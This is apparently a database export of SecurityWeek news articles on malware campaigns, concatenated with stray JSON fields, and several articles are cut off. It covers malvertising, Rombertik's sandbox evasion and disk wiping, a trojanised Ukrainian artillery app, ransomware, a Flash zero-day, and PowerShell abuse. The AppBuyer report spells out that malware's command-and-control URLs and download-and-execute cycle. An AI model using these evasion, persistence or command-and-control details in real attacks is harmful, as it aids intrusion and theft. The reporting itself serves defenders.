In fact, it is nine times bigger.     Two weeks ago, Cisco's Talos Security Intelligence and Research Group revealed the existence of the network, which was responsible for placing malicious advertisements on websites such as amazon.com, ads.yahoo.com, youtube.com and 70 other domains. What they found however, was just the beginning. \"The “Kyle and Stan” network is a highly sophisticated malvertising network,\" blogged Armin Pelkmann, threat researcher with Cisco. \"It leverages the enormous reach of well placed malicious advertisements on very well known websites in order to potentially reach millions of users. The goal is to infect Windows and Mac users alike with spyware, adware, and browser hijackers.\"   According to Pelkmann, Cisco has now isolated 6,491 domains sharing the same infrastructure – more than nine times more than the previously reported 703 domains.   \"We have observed and analyzed 31151 connections made to these domains,\" he blogged. \"This equals over 3 times the amount of connections previously observed. The increase in connections is most likely not proportional to the domains due to the fact that a long time that has passed since the initial attacks.\"   The first attempts to spread malware, spyware and adware are dating back to January 2012, he wrote.   \"The domains of the type kyle.mxp677.com, stan.mxp681.com and lpmxp47.com seem to have usually a relatively short lifespan until they get replaced,\" he blogged. \"The attacker seems to use them for a short while, burn them and move on to the subsequent number. Domains like megashre.info or file36.com seem to be used for a longer period and are still active.\" \"Noteworthy is that the popular domain www.winrar.com is also part of  these attackers network,\" he continued. \"The website is build to fool visitors into believing they are installing the popular compression tool WinRar, but instead they are downloading malware. This website exhibits a significant traffic load and is a good example on how the attackers behind this network are trying to fool users into installing their malware.     The malware droppers used in the campaign leverage \"clever techniques and encryption\" to ensure unique checksums to avoid detection, Pelkmann noted.   \"The count of websites connected to the attacker's infrastructure is now up to 6491 and is growing daily,\" he wrote. \"The fact that parts of this infrastructure date back to January 2012 is concerning, as it shows that the threat actors have been active for over 2 and a half years.\"   In its 2014 Midyear report, Cisco called malvertising a \"disruptor for the Internet economy.\"   \"Malvertising is becoming more prevalent, and adversaries are able to launch highly targeted campaigns,\" the report notes. \"A malvertiser who wants to target a specific population at a certain time—for example, soccer fans in Germany watching a World Cup match—can turn to a legitimate ad exchange to meet their objective.\"   Last week, researchers with MalwareBytes reported that the websites of The Times of Israel and The Jerusalem Post were serving malicious advertisements that redirected victims to a page hosting the Nuclear Exploit kit.

The malware, known as Rombertik, is the latest in a long line of examples of malware designed to make the lives of analysts and researchers harder.  \"It is very common for malware to contain anti-debug, anti-virtualization, and anti-analysis features,\" said Christiaan Beek, director of threat intelligence for McAfee Labs, part of Intel Security. \"Some of the more sophisticated attacks we’re seeing utilize payload delay timing whereas the real payload isn’t dropped until the malware figures out it’s a real target and not some sandbox. Execution of payload is delayed for a specified period of time to determine if the system its running on is a sandbox or a real machine.\" \"An overall theme we’re seeing here is that most malware using such tactics are attempting to prevent getting blacklisted so they can infect and persist for a longer period of time,\" he continued. \"Threats like Rombertik, which perform obviously malicious behavior in the presence of a research environment are less common.\" Rombertik is being spread through spam and phishing messages. According to Cisco, if executed, Rombertik will first stall, then run through a series of anti-analysis checks to see if it is running in a sandbox. Once these checks are complete, the malware will decrypt and install itself on the victim's computer to maintain persistence. \"After installation, it will then launch a second copy of itself and overwrite the second copy with the malware’s core functionality,\" blogged Cisco researchers Ben Baker and Alex Chiu. \"Before Rombertik begins the process of spying on users, Rombertik will perform once last check to ensure it is not being analyzed in memory. If this check fails, Rombertik will attempt to destroy the Master Boot Record (MBR) and restart the computer to render it unusable.\" This second anti-analysis function computes a 32-bit hash of a resource in memory and compares it to the PE Compile Timestamp of the unpacked sample. If the resource or compile time has been changed, the malware will try to overwrite the Master Boot Record of PhysicalDisk0, making the computer inoperable. If the malware lacks the permissions to overwrite MBR, it will instead destroy all files in the user's home folder. Rombertik also employs several layers of obfuscation, including the use of garbage code. According to Cisco, the unpacked Rombertik sample is 28KB while the packed version is 1264KB. More than 97 percent of the packed file is dedicated to making the file look legitimate by including 75 images and 8,000 functions that are never used, the researchers noted. \"A common technique to evade sandboxes is to sleep for extended lengths of time with the intention of forcing the sandbox to time out before the malware “wakes up” and begins executing,\" the researchers explained. \"In response, sandboxes got better at detecting and responding when malware slept for extended periods of time. Rombertik employs a similar approach to delay execution, but does so without sleeping.\" Instead, they blogged, it writes a byte of random data to memory 960 million times to consume time. Sandboxes may not be able to immediately determine that the application is intentionally stalling since it is not sleeping. In addition, the repetitive writing would flood application tracing tools. \"If an analysis tool attempted to log all of the 960 million write instructions, the log would grow to over 100 gigabytes,\" the Cisco researchers blogged. \"Even if the analysis environment was capable of handling a log that large, it would take over 25 minutes just to write that much data to a typical hard drive. This complicates analysis.\" According to Tom Kellermann, chief cybersecurity officer at Trend Micro, common sandbox evasion techniques include having the payload wait until mouse clicks are detected, virtual machine detection and port binding. Misdirection and dead code is common in malware, but typically not as elaborate as Rombertik, said Tim Stiller, consultant with Rapid7's analytic response team.  \"What makes Rombertik really stand out is its destructive capability to overwrite the MBR or encrypt files if it detects any tampering has occurred,\" he said. \"Other malware families that use tampering detection normally just exit execution.\" " }

Fancy Bear is also known as APT28, Pawn Storm, Sofacy, Tsar Team, Strontium and Sednit. The group is believed to be responsible for many high-profile attacks, including recent operations aimed at the U.S. Democratic Party, government organizations in Turkey and Germany, and the World Anti-Doping Agency (WADA). CrowdStrike believes Fancy Bear is likely tied to GRU, the foreign military intelligence agency of Russia’s Armed Forces, and the company’s recent findings reinforce this theory. This summer, the company’s analysts came across an Android application package (APK) file named “Попр-Д30.apk.” The file contained Russian-language artifacts and its name referenced the D-30, a Russian-made 122 mm towed howitzer that first entered service in the 1960s. The D-30 is still used by the Ukrainian military and, in 2013, artillery officer Yaroslav Sherstuk created an Android app designed to help personnel reduce the time to fire the gun from minutes to under 15 seconds. According to its developer, the application has roughly 9,000 users. According to CrowdStrike, Fancy Bear took the legitimate Android app and bundled it with an Android variant of X-Agent, a piece of malware that has been used by the threat actor in attacks aimed at high-value targets, including the Democratic National Committee (DNC). The malicious version of the app was distributed on Ukrainian military forums from late 2014 through 2016. Experts believe the legitimate program had been mainly distributed through social media, not via the Google Play store. The Android variant of the X-Agent malware appears to be designed for strategic purposes as it does not cause any damage to the infected device and it does not interfere with the operation of the original app. X-Agent is capable of accessing contact information, SMS messages, call logs and Internet data. “CrowdStrike Intelligence assesses a tool such as this has the potential ability to map out a unit’s composition and hierarchy, determine their plans, and even triangulate their approximate location. This type of strategic analysis can enable the identification of zones in which troops are operating and help prioritize assets within those zones for future targeting,” CrowdStrike wrote in its report. “Additionally, a study provided by the International Institute of Strategic Studies determined that the weapons platform bearing the highest losses between 2013 and 2016 was the D-30 towed howitzer. It is possible that the deployment of this malware infected application may have contributed to the high-loss nature of this platform,” the report adds. The threat intelligence firm pointed out that the purpose of the malicious D-30 app further strengthens its belief that Fancy Bear is likely affiliated with Russia’s GRU agency. " }

Originally called PrisonLocker but also known as PowerLocker, the malware has been apparently under development for several months and has been promoted in various hacker forums as well as publicly on Pastebin. Written in C/C++, the malware's author says that it will encrypt virtually every file on infected machines - except .exe, .sys, .dll and other system files - via Blowfish. The uniquely generated Blowfish key is then encrypted with RSA-2048 encryption. The ransomware also encrypts files on shared drives, and detects virtual machine, debugger and sandbox environments.   \"You can either approve or deny (resetting the removal clock duration, specified by you during purchase) a payment code, and then unlock/decrypt files on the PC (identified by IP),\" according to an announcement of the malware posted on Pastebin.   Calling the malware a natural evolution from CryptoLocker, Bit9 CTO Harry Sverdlove said that he expects more ransomware to be on the horizon in 2014.   \"Based on the successes and failures of its predecessors, PrisonLocker appears to use more efficient methods of deterring security analysts and threat researchers, such as virtual machine/sandbox detection and more comprehensive disabling of user interaction,\" he said. \"The techniques used by these types of ransomware attacks are well documented and not necessarily advanced, but they are unfortunately very effective.\"   The malware author claims to be willing to sell the malware for about $100 per license. In an ironic twist, Malware Must Die said they were able to tie the malware's author to a Twitter account @Wenhsl and the security blog Wenhsl[dot]blogspot.com. In the Twitter profile, the user describes himself as an \"infosec/malware researcher.\"   Andrew Meyer, vice president of intelligence services at CrowdStrike, speculated that the person may have a foot in two worlds – the white hat world and the black hat world.   \"He's probably seeing that being a legitimate security researcher was not as financially-motivating or beneficial as he hoped it might have been, so maybe he's starting to look into other options,\" he said.   He added that posting details of the malware to a public forum was not a smart idea.   \"This is not somebody…I would say was maybe as good a criminal as he was a coder perhaps because his operational security was just terrible,\" he said.   Malware Must Die urged law enforcement to take a look at the information that has been gathered on the case and the suspect.   \"Most malware authors are no different than everyone else – they follow trends that have proven to be successful,\" said Sverdlove. \"CryptoLocker has garnered a lot of press lately and has been very lucrative for the criminals. That’s a two-for-one win: the attackers get both money and glory, appealing to both criminals and hackers alike. It is inevitable that copycats and variants will follow.

Few details have been provided, but KISA says the vulnerability affects Flash Player 28.0.0.137 and earlier. Version 28.0.0.137 is the latest, released by Adobe in January as part of the Patch Tuesday updates. The security hole can be exploited by getting a user to open a document, web page or email containing a specially crafted Flash file, KISA said on Wednesday. Simon Choi of South Korea-based cybersecurity firm Hauri said on Twitter the Flash Player zero-day has been exploited by North Korea since mid-November 2017 in attacks aimed at South Korean individuals who focus on researching North Korea. According to the expert, the flaw has been leveraged to distribute malware. A screenshot he posted appears to show that the exploit has been delivered via malicious Microsoft Excel files.  SecurityWeek has reached out to Adobe for comment and will update this article once the company responds. Since the activities of North Korean threat actors have been closely monitored by several security firms, it’s possible that Adobe has already been made aware of the zero-day and is working on a patch. UPDATE. Adobe says it's aware of a report that an exploit for a vulnerability it tracks as CVE-2018-4878 exists in the wild, and is being used in limited, targeted attacks against Windows users. The company says it will address the flaw with an update planned for the week of February 5. In an advisory, Adobe said the vulnerability is a critical use-after-free that allows remote code execution. Until a patch becomes available, the company has provided some mitigations. \"Beginning with Flash Player 27, administrators have the ability to change Flash Player's behavior when running on Internet Explorer on Windows 7 and below by prompting the user before playing SWF content,\" Adobe said. \"Administrators may also consider implementing Protected View for Office. Protected View opens a file marked as potentially unsafe in Read-only mode.\" " }

Operation Emmental has been around since at least 2012 and the individuals who run it – experts determined that they are likely Russian speakers – have continued to improve their malware. The group has been known to leverage Android malware, designed to bypass two-factor authentication (2FA) and lock victims out of their smartphones, and a Windows banking Trojan tracked as Retefe and WERDLOD. However, researchers believe a variant of the Dok malware has also been used in Operation Emmental to target Swiss banks. Dok, a piece of malware typically delivered via email, is designed to spy on victims by installing a new root certificate and modifying the infected device’s network settings in order to redirect traffic through Tor. According to Trend Micro, in the Operation Emmental attacks, the malware is configured to hijack traffic only if the victim’s external IP is located in Switzerland. Tracked by the security firm as OSX_DOK.C, the Trojan redirects users to a fake online banking login page if they visit the website of a financial organization whose domain is specified in a hardcoded list. An analysis by Trend Micro and others showed that Dok actually appears to be the Mac version of Retefe/WERDLOD. Experts pointed out that both pieces of malware kill the web browser process before installing fake certificates, they share proxy settings and script formats, and they target mostly the same Swiss banks. “Given the connection between WERDLOD and OSX_DOK.C, it is reasonable to assume that the latter is also a part of the Operational Emmental campaign,” Trend Micro researchers said in a blog post. The security firm also pointed out that more recent versions of the Dok malware leverage a bug in the Ultimate Packer for Executables (UPX) tool to pack the Trojan and make it more difficult for security products to detect the threat.

According to a survey of 200 IT and information security professionals, 75 percent agreed that detecting and preventing a breach has become harder. Fifty-nine percent said malware has grown more sophisticated during the last 24 months and presents fresh challenges - even though the vast majority (87 percent) said they have increased endpoint security spending during the same period. The survey also revealed that 54 percent felt that it was impossible to keep up with the amount of alerts related to endpoint security threats and breaches. \"Despite efforts to stay on top of patches and updates – and spending more on endpoint security products that should detect malware – it is obvious that IT organizations are becoming frustrated in their attempts to stay ahead of cyber criminals,\" said Jon Oltsik, senior principal analyst with the Enterprise Strategy Group, in a statement. A particular focus of the survey was the subject of browser-based breaches. Eighty-one percent of organizations that experienced a security breach within the past 24 months that tied it to an attack that was introduced into the network via a browser classified the time it took to remediate the breach as \"very significant\" or \"significant.\" Some 82 percent of those surveyed said they were concerned about files containing malicious content downloaded via browsers. Eighty-five percent reported that their IT departments work to keep browsers patched, and 84 percent monitor browser configurations for vulnerabilities. Ninety-two percent said they would characterize their organization as being \"very aggressive\" or \"somewhat aggressive\" in terms of their willingness to test and adopt new types of cybersecurity technologies. \"The common web browser is a malware distribution system for advanced persistent threats,\" Branden Spikes, CEO and CTO of Spikes Security, which commissioned the study, said in a statement. “It’s simultaneously the most ubiquitous and strategically important application in the enterprise, so naturally it has become the focus for hackers. Every click can potentially place the network and the organization at risk.\" " }

The malware has been appropriately dubbed 'AppBuyer'. According to Palo Alto Networks, the malware was mentioned first by members of the WeiPhone Technical Group in May, when they remotely assisted a user in finding out why certain apps periodically had been installed onto his device. They ultimately located two strange files that would download, execute and delete other executable files.   \"We still don’t know how the AppBuyer malware was installed onto jailbroken iOS devices,\" blogged researcher Claud Xiao. \"There’re some possibilities that include through malicious Cydia Substrate tweak (like Trojan.iOS.AdThief) hosted in third-party Cydia sources, through other PC malware, through a PC jailbreaking utility, or possibly some other unknown ways.\"   What the researchers do know is that after the devices were infected, two files appear in the file system - /System/Library/LaunchDaemons/com.archive.plist and bin/updatesrv. The com.archive.plist is a launchd daemon configuration file that specified that every 7,200 seconds (or 2 hours) the /bin/updatesrv will be loaded and run.   At first, updatesrv will connect to http ://www.jb-app.com/updatesrv.aspx?f=1 to fetch configuration of local UUID file path: /etc/uuid. Then it reads the UUID from this file and constructs the second URL: http: //www.jb-app.com/updatesrv.aspx?f=2&uuid=<UUID>, Xiao explained.   \"The updatesrv will then determine whether the server returns “IDLE”,\" he blogged. \"If so, it will exit immediately; otherwise, it will download two files from the server, rename them as /tmp/u1 and /tmp/u2, then execute the first one, and lastly delete all of the files. During the course of our analysis, we found that after updatesrv executes three times, the server will always return IDLE.\"   During the first execution, the updatesrv will determine if /etc/uuid exists; if it doesn't, the second URL will have no UUID value. At that point, updatesrv will download two files named u1 and u2 using the following URLs:     \"The code in u1’s  is quite simple, it generates a new UUID by combining the current time, a random number between 0 to 9999 and current process ID, and stores it into /etc/uuid,\" the researcher wrote. \"The u2 file simply contains the character “1”, but this is not used by the code.\"   After the UUID generated, the second execution of updatesrv accesses the URL with the UUID value:     The server returns u1_80 and u2_80 as results, then downloads files from:     The code in u1_80 simply copies u2_80 into /Library/MobileSubstrate/DynamicLibraries/aid.dylib. The u2_80 will be loaded by the Cydia Substrate framework later on. The u2_80 is a Cydia Substrate tweak. After it is loaded it will hook the (void)connectionDidFinishLoading:(id)arg1; method of the ISURLOperation class. It uses this hook to capture every HTTP or HTTPS request made by the victim's device and inspect the traffic for the user's apple ID, GUID (Globally Unique Identifier) or password.   In the third execution cycle, the malware uses the victim's information to buy apps from the official App Store.   \"We highly recommend iOS users not jailbreak their devices,\" blogged Xioa. \"AdThief, another iOS malware found by Palo Alto Networks in this year, which also targets jailbroken iOS devices, has infected more than 75,000 devices. Another example is Unflod, which is a malicious Cydia Substrate tweak, will steal a victim’s Apple ID in the similar way.\"   The full technical write-up can be found here. " }

Launched in late October, Zcash (ZEC) is similar to Bitcoin, but the sender, recipient and value of transactions can be hidden. It was initially worth $30,000 per unit, but its value declined steadily as the number of units increased. At the time of writing, one ZEC is worth 0.06 BTC or $49. Zcash is currently one of the most profitable cryptocurrencies, which is why it has attracted the attention of cybercriminals. Kaspersky Lab has reported seeing roughly 1,000 devices infected with Zcash miners. At the current value of ZEC, the people controlling these 1,000 miners could make thousands of dollars each month and tens of thousands of dollars per year. The security firm said it had not spotted any attempts to install these Zcash miners using website vulnerabilities or email spam campaigns. Cybercrooks have been disguising the miners as legitimate applications and distributed them via torrent websites. However, experts warn that their tactics could change at any time – attackers could start delivering miners to computers that are already infected with malware. The mining applications (e.g. Micemash) are not actually malicious, which is why they are often not flagged as a threat by security products. Kaspersky products detect the Zcash miners as not-a-virus:RiskTool.Win64.BitCoinMiner, but the company pointed out that users must enable protection for unwanted software if they want this type of software to be detected. Once installed on a computer, the miners will typically have names that are similar to legitimate applications, such as system.exe, diskmngr.exe, taskmngr.exe or svchost.exe. In order to ensure that the mining program is executed every time the computer starts, the attackers use either the task scheduler or registry keys. While these miners are not actually malicious, they can create problems if installed on a computer without the user’s consent. “Firstly, these operations are power hungry: the computer uses up a lot more electricity, which, in some countries, could mean the user ends up with a hefty electricity bill,” explained Kaspersky’s Alexander Gostev. “Secondly, a mining program typically devours up to 90% of the system’s RAM, which dramatically slows down both the operating system and other applications running on the computer. Not exactly what you want from your computer.” " }

For its European customers, it also served up malicious ads. Unfortunately for the infected, malvertising continues to pose a problem to websites of all sizes, and policing the ecosystem of online advertising remains a serious challenge. \"Spreading malware over the Web is about traffic volume,\" said Wayne Huang, vice president of Armorize Technologies at Proofpoint. \"Large websites have the volume, but it's much harder to hack [them]. However, all large websites serve advertisements.\" During the last 30 days, researchers at Blue Coat Systems have detected 47 different IP addresses used by malvertisement servers. Nearly all of that traffic occurred beginning on Dec. 29, with Jan. 2nd and Jan. 3rd being the high-water marks, explained Chris Larsen, malware researcher at Blue Coat Systems. In the case of the recent Yahoo incident, the attackers were able to spread malware from Dec. 31 to Jan. 3 by redirecting users to sites hosting the Magnitude exploit kit. It was not made clear in Yahoo's statement exactly what part of the online advertisement ecosystem the attackers were able to infiltrate. According to Online Trust Alliance Executive Director Craig Spiezle, many of these incidents happen by the accepting of an ad through an ad exchange and not just through ads companies like Yahoo accept directly. The vast number of third-parties involved in the process of pushing ads makes addressing the issue complex. \"The way ad serving is set up today is assuming everyone is trustworthy,\" Spiezle said. \"So you have advertisers, you have ad agencies, you have ad networks, you have ad aggregators, you have ad exchange, you have all these third-parties that touch an ad or could be putting in an ad or an ad tag to make it very efficient for sites to take and receive advertising. So that's all great. But that same flexibility in the design makes it very easy to [penetrate] and compromise any one of those.\" According to RiskIQ CEO Elias Mansousos, the number one attack vector for malvertisers is the impersonation of legitimate ad creators and agencies. \"ATO [account takeover] is also a major vector since many agency accounts are trusted,\" he said. \"If a malvertiser gains access to these accounts, they are more likely to get suspect creative approved even against an ad quality team's better judgment. Number three is hacking of the infrastructure. You see this more with hosted ad servers running smaller networks or agencies.\" Since a successful malvertising attack on a high-traffic site can represent a significant bounty for attackers, the threat remains persistent. The Online Trust Alliance [OTA] has been examining the issue of malicious ads for years. Among its recommendations is to create an accreditation/authentication process for new clients and ad agencies and to decline those that do not meet its standards. But even that can fall short if ad providers are not continually measured against those requirements, Larsen said. \"A lot of it happens more or less automatically - once the 'big ad network' has vetted a prospective new partner, my sense is that they don't pay nearly as much attention to what that ad provider is doing now compared to its behavior during the vetting process,\" he added. \"Also, there can be multiple layers of providers involved, and they're all serving chunks of obfuscated javascript instead of a simple banner graphic like the old days. Nowadays it's all about the metrics, and to gather those you need javascript. So it's often very hard for the host site for example to know who actually served the final ad in that space that they turned over to the big ad network.\" \"If I had my way, I would eliminate dynamic content,\" opined Chester Wisniewski, senior security advisor at Sophos. \"Strict adherence to only retrieving ads from a short list of trusted domains and images only. No JavaScript, no video, etc. The destinations also need to be screened on a frequent basis to be sure they have not fallen victim to attackers as well.\" \"If you run your own ads, be sure you have humans checking the veracity of the ads and those placing them,\" he added. Other solutions to the problem include taking a code-signing approach similar to what is done in the world of mobile applications, Spiezle noted. However, like other proposed fixes, this can add friction, time and cost to the process of publishing ads, he said. Still, it is clear that the industry address the issue through malware scanning, code testing and having a strong vetting process. \"This [attack on Yahoo] needs to be a wakeup call that systemic changes must be in place to protect consumers from harm,\" Spiezle said.

While a majority of the samples appear to be in the testing phase, we could soon start seeing attacks. The Meltdown and Spectre attack methods allow malicious applications to bypass memory isolation mechanisms and access passwords, photos, documents, emails, and other sensitive data. Shortly after Spectre and Meltdown were disclosed on January 3, experts warned that we could soon see remote attacks, especially since a JavaScript-based proof-of-concept (PoC) exploit for Spectre had been made available. On January 17, antivirus testing firm AV-TEST reported that it had seen 77 malware samples apparently related to the CPU vulnerabilities, and the number had increased to 119 by January 23. On Wednesday, AV-TEST told SecurityWeek that it has obtained 139 samples from various sources, including researchers, testers and antivirus companies.  “Most appear to be recompiled/extended versions of the PoCs - interestingly, for various platforms like Windows, Linux and MacOS,” Andreas Marx, CEO of AV-TEST, told SecurityWeek. “We also found the first JavaScript PoC codes for web browsers like IE, Chrome or Firefox in our database now.” Fortinet, which also analyzed many of the samples, confirmed that a majority of them were based on available PoC code. Marx believes different groups are working on the PoC exploits to determine if they can be used for some purpose. “Most likely, malicious purposes at some point,” he said. The expert believes the current malware samples are still in the “research phase” and attackers are most likely looking for ways to extract information from computers, particularly from web browsers. He would not be surprised if we started seeing targeted and even widespread attacks in the future. Processor and operating system vendors have been working on microcode and software mitigations for the Meltdown and Spectre attacks, but the patches have often caused problems, leading to companies halting updates and disabling mitigations until instability issues are resolved. In addition to installing operating system and BIOS updates, Marx has two other recommendations that should reduce the chances of a successful attack: switching off the PC when it’s not needed for more than an hour, and closing the web browser during work breaks. “This should decrease your attack surface a lot and also save quite some energy,” Marx said.

The New York Times and Bloomberg revealed last week that the FBI and the DHS had issued a joint report warning of cyberattacks targeting manufacturing plants, nuclear power stations and other energy facilities in the U.S. and elsewhere. Unnamed officials said the attacks hit at least a dozen power firms in the United States, including the Wolf Creek nuclear facility in Kansas. The U.S. Department of Energy said it was working with affected firms and pointed out that only administrative and business networks appeared to be impacted, not systems controlling the energy infrastructure. Wolf Creek representatives told SecurityWeek that while they can’t make public comments on security issues, they can confirm that the attacks did not have any operational impact on the facility as control systems are completely separate from the corporate network. According to the FBI/DHS report, the campaign has been active since at least May and an initial investigation showed that the techniques used by the hackers were similar to ones associated with a Russia-linked threat actor tracked as Crouching Yeti, Energetic Bear and Dragonfly. The group has been known to target industrial companies. Russia has also been accused of orchestrating destructive attacks aimed at Ukraine’s power grid. Researchers have recently published an in-depth analysis of the malware believed to have been used in the latest of these attacks. The FBI/DHS alert said the attackers sent malicious emails to senior industrial control engineers in an effort to deliver malware designed to harvest credentials and allow them to access the targeted organization’s network. “As a class, engineering professionals may reasonably be expected to possess valuable intellectual property such as product or facility design, and have access to industrial control networks,” said Sean McBride, critical infrastructure lead analyst at FireEye.

This is not the first time the CareerBuilder website has been used in a scheme to infect unsuspecting users. In 2013, researchers with Trusteer identified an attack using the job-hunting site to infect victims with the Zeus Trojan. This time, the attack utilized malicious Microsoft Word documents disguised as resumes. \"When a resume has been submitted to a listed job opening, the CareerBuilder service automatically generates a notification email to the job poster and attaches the document, which in this case is designed to deliver malware,\" Proofpoint explained. \"While this approach is more manual and requires more time and effort on the part of the attacker, the probability of the mail being delivered and opened is higher.\" \"Rather than attempt to create a realistic lure, the attackers here have instead capitalized on the brand and service of a real site: the recipients are likely to read them and open the attachments because not only are they legitimate emails from a reputable service, but these emails are expected and even desired by the recipient,\" the researchers added. \"Moreover, because of the way that resumes are circulated within an organization, once the document has been received by the owner of the job listing (often “[email protected]<company name>”) it will be sent to the hiring manager, interviewers, and other stakeholders, who will open and read it as well. Taking advantage of this dynamic enables the attackers to move laterally through their target organization.\" The Office document is built using the Microsoft Word Intruder Service (MWI) and exploits a memory corruption vulnerability for Word RTF, according to Proofpoint. \"MWI is an underground crime service – already well documented – that builds CVE-weaponized dropper or downloader documents for any malware,\" according to Proofpoint. \"A seller with handle “Object” has been observed offering the service since May 31, 2013 on underground Russian forums for approximately US$2,000 to US$3,000.\" The malware dropped in the attack is a backdoor known as Sheldor. TK Keanini, CTO of Lancope, said that the attack shows how cybercriminals are becoming less direct and more advanced. \"Attackers prey on the deterministic behaviors of systems where they can predict future action,\" he said. \"Before clicking on any attachment, users everywhere need to understand to what degree it is authentic and how well they know the originating source.

In a follow-up to a report earlier this year on the reappearance of visual basic code in malicious documents, researchers at Sophos have found that the trend has not only continued - it's increased.   According to new research, Sophos' most recent detection statistics show that the percentage of macro-based malware rose from around six percent of all document malware in June to 28 percent in July.    Visual Basic code offers attackers some benefits, Graham Chantry, senior security researcher at SophosLabs, noted in his report.   \"Few users run without any anti-virus software these days meaning malware families are forced to change form continuously in an effort to evade detection,\" he wrote. \"An exploit’s file structure is usually quite rigid which makes tweaking it without breaking its functionality difficult. Visual Basic code is easy to write, flexible and easy to refactor. Similar functionality can often be expressed in many different ways which gives malware authors more options for producing distinct, workable versions of their software than they have with exploits.\"   While exploits are tied to specific versions of Microsoft Office, visual basic code isn't – meaning the attacker does not have to hope the users is running a particular iteration of the software.   About 15 years ago, VBA (Visual Basic for Applications) macro malware like the ILOVEYOU worm and the Melissa virus were raising eyebrows around the world. Their use died down in the ensuing years. But attackers have begun using them again in recent months.   Attackers have taken to using social engineering techniques to trick users into enabling macros. A common tactic, Chantry noted in his report, is claiming that a document's content is obfuscated for security reasons or that it requires different software to open correctly. In another example, a malicious document claiming to be protected by 'SOPHOS Encryption' software and needed to have macros enabled.   \"One of the most interesting things I found during research for this paper was the surge in sophisticated social engineering methods,\" Chantry told SecurityWeek.   \"Document-based malware is commonly circulated in spam where the attached document is often inconsistent with the email content,\" he added. \"For example an email claiming to be concerned with a court appearance with an attachment claiming to be an invoice. Utilizing encryption means spammers can make use of the same…trick in multiple spam campaigns regardless of context. Masquerading as an AV vendor only serves to make the document appear more genuine and lures the user into a false sense of security that the document is probably not malicious.\" " }
{ "_id" : { "$oid" : "5b27c46c6cefc41c844ab329" }, "Category" : "Malware", "Title" : "Most External PowerShell Scripts Are Malicious: Symantec", "Address" : "https://www.securityweek.com/most-external-powershell-scripts-are-malicious-symantec", "Date" : "December 09, 2016", "Article" : "PowerShell, the scripting language and shell framework that is installed by default on most Windows computers, is becoming a favored attack tool for malware infections. In fact, over 95% of scripts using PowerShell were found to be malicious, according to a new report from Symantec. The flexibility of the framework allows attackers to abuse it to download malicious payloads, perform reconnaissance operations, or traverse across networks. And with 95.4% of the PowerShell scripts that Symantec analyzed being malicious, it’s clear that they represent a major threat to both consumers and businesses (especially when externally sourced PowerShell scripts are involved). Many of the recently observed targeted attacks have been using PowerShell scripts, including those launched by the Odinaff group, or those orchestrated by the Kovter Trojan’s authors. The use of PowerShell allows for a fileless infection, and the actors behind banking Trojans and other type of threats started to adopt it as well. The most recent example of a piece of malware that abuses PowerShell is August, threat designed to steal credentials and sensitive files. The threat is distributed via malicious Word documents containing macros that, once enabled, launch a PowerShell command to download and install the final payload. Symantec researchers say they observed many other instances where Office macros and PowerShell scripts were employed for payload download. In fact, the most prevalent malware families that currently use PowerShell include W97M.Downloader (9.4% of all analyzed samples), Trojan.Kovter (4.5%), and JS.Downloader (4%), the security company notes in a report that focuses specifically on the use of PowerShell in attacks. The numbers come from the Symantec Blue Coat Malware Analysis sandbox, which saw 49,127 PowerShell scripts submitted this year alone. The security researchers also manually analyzed 4,782 recent distinct samples that represent a total of 111 malware families that abuse the PowerShell command line. The number of received samples increased sharply in 2016, mainly fueled by an increase in the activity of JS.Downloader and Kovter. In the second quarter of the year, Symantec’s sandbox received 14 times more PowerShell samples compared to the previous quarter, while the third quarter saw a 22-fold increase compared to the second quarter. Attackers, Symantec says, mostly use their PowerShell scripts post-compromise, to download additional payloads, and they also employ various techniques to ensure the scripts are executed, such as the use of extensions others than .ps1, which is usually being blocked. The researchers also reveal that, of the 10,797 PowerShell script executions observed this year, including benign ones, 55% of the scripts that launched were started through cmd.exe on the command line. When it comes to malicious scripts only, 95% of them are executed through cmd.exe. However, because most macro downloaders are blocked before being executed on the computer, they never reach the point where they would be encountered by Symantec’s behavioral engine. “However, out of the 111 analyzed threat families that use PowerShell, only eight percent used any obfuscation such as mixed-case letters. None of the analyzed threats randomized the order of the command arguments. The most commonly used PowerShell command-line argument was “NoProfile” (34%), followed by “WindowStyle” (24%), and “ExecutionPolicy” (23%),” Symantec says. As examples of threats that use PowerShell, Symantec offers the Nemucod downloader that has been associated with the Locky ransomware. However, PowerShell is often associated with Office macros, though researchers say that exploit kits have been experimenting with the framework as well, including RIG, Neutrino, Magnitude, and Sundown. For lateral movement in a compromised network, attackers abusing PowerShell use methods such as Invoke-Command, Enter-PSSession, WMI/wmic/Invoke-WMImethod, Profile injection, Task Sheduler, and even common tools, such as PsExec. For persistence, PowerShell is abused through storing scripts in the registry (Trojan.Poweliks did so in 2014), by scheduling tasks, by placing the script in the startup folder, by leveraging WMI or Group policies (GPOs), or by infecting local profiles. Symantec’s report also details the obfuscation methods that cybercriminals use for their PowerShell scripts, while also offering info on some of the most common PowerShell malware, including ransomware, keyloggers, and banking and backdoor Trojans. Additionally, it offers a glimpse of the most prominent attacks that employ the framework, as well as on some dual-use tools. “With the evidence we have shown of a rising tide of threats leveraging PowerShell, we recommend bolstering defenses by upgrading to the latest version of PowerShell and enabling extended logging features. Additionally, make sure that PowerShell is considered in your attack scenarios and that the corresponding log files are monitored,” Symantec concludes. " }

Moller–Maersk, revealed this week at the World Economic Forum in Switzerland that the company was forced to reinstall software on nearly 50,000 devices following the NotPetya attack. In a panel on securing a common future in cyberspace, Hagemann Snabe, former co-CEO of SAP, said the NotPetya malware had hit a large number of systems housed by the company. According to Hagemann Snabe, Maersk’s IT team had to reinstall software on its entire infrastructure, including 45,000 PCs and 4,000 servers, totaling 2,500 applications. The mammoth task took only 10 days to complete, during which time the company manually coordinated operations. This was not easy considering that Maersk is the largest container shipping company in the world and it’s responsible for roughly 20 percent of world trade. Hagemann Snabe noted that a ship carrying 10,000-20,000 containers docks into a port every 15 minutes. Maersk employees managed to manually process 80 percent of the work volume, but the NotPetya incident still cost the company $250-$300 million. In the aftermath of the cyberattack, the shipping giant realized that its cybersecurity capabilities had been only “average,” but Hagemann Snabe says the company is now determined to improve cybersecurity to the point where it “becomes a competitive advantage.” “We need a very significant increase in our level of understanding of this problem,” Hagemann Snabe told the panel. “It is time to stop being naive when it comes to cybersecurity. I think many companies will be caught if they are naive – even size does not help you. I think it is very important that we are not just reactive but proactive, and I think we can’t be average, we got to be the best we can.” Hagemann Snabe believes his company was probably collateral damage in a state-sponsored attack.  The NotPetya malware outbreak, which U.S. and Ukrainian government agencies have attributed to Russia, affected tens of thousands of systems in more than 65 countries. Many of the victims were located in Ukraine, the home of a tax software firm whose product was used as the main attack vector. Researchers 